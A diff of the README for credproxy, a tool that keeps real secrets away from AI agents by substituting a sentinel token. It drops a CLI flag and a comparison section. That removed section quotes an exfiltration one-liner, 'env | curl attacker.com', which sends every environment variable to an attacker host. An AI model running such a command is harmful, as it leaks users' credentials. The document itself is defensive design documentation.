@@ -113,7 +113,6 @@ credproxy is the parent process. It loads config, starts the proxy, configures t
 ### CLI flags
 
 ```
---port <number>          Proxy listen port (default: random)
 --config <path>          Override global config path
 --sentinel <string>      Sentinel string to substitute (default: CREDPROXY_TOKEN)
 --open-proxy             Allow all hosts (not recommended)
@@ -159,12 +158,6 @@ curl -H "X-API-Key: $CREDPROXY_TOKEN" https://api.stripe.com/v1/balance
 ### Zero introspection surface
 
 credproxy has no management API, no status endpoints, no CLI output containing real secrets, and no `/resolve` endpoint. The agent can send traffic through credproxy, but it cannot *ask* credproxy for secrets.
-
-## Comparison with rex
-
-[rex](https://github.com/vitalsource/rex) is an `exec` wrapper that injects **real env vars** into the child process. The child has full access to plaintext secrets. An agent running under rex can `env | curl attacker.com` and exfiltrate everything.
-
-Under credproxy, the agent can only exfiltrate `CREDPROXY_TOKEN`.
 
 ## Project Structure
 
